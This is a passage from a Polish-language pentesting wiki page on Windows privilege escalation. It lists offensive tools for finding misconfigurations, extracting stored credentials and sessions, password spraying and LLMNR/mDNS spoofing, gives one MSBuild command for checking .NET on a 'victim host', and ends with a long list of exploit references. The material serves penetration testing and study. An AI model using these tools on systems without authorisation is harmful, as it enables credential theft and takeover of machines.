[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i wrażliwe pliki (**[**zobacz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywane.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**zobacz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalnie użyj opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia poświadczenia z Credential Manager. Wykrywane.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe wyliczanie informacji o Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (DEPRECATED, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga kompilacji przy użyciu VisualStudio) ([**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia poświadczenia z wielu programów (w repozytorium GitHub znajduje się skompilowany plik exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (w repozytorium GitHub znajduje się skompilowany plik wykonywalny). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do prawidłowego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje dane wyjściowe **systeminfo** i wskazuje działające exploity (lokalny skrypt Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje dane wyjściowe **systeminfo** i wskazuje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić wersję .NET zainstalowaną na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty z lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — ataki na Windows: AT is the new black (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: phishing z użyciem makra Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak z format string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniach jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików z wymaganymi uprawnieniami w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania dowiązań symbolicznych — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: prymityw pełnego odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików w celu eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka umożliwiająca lokalną eskalację uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — delegowanie Kerberos Resource-Based Constrained Delegation: jak zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usuwanie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtwarzanie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
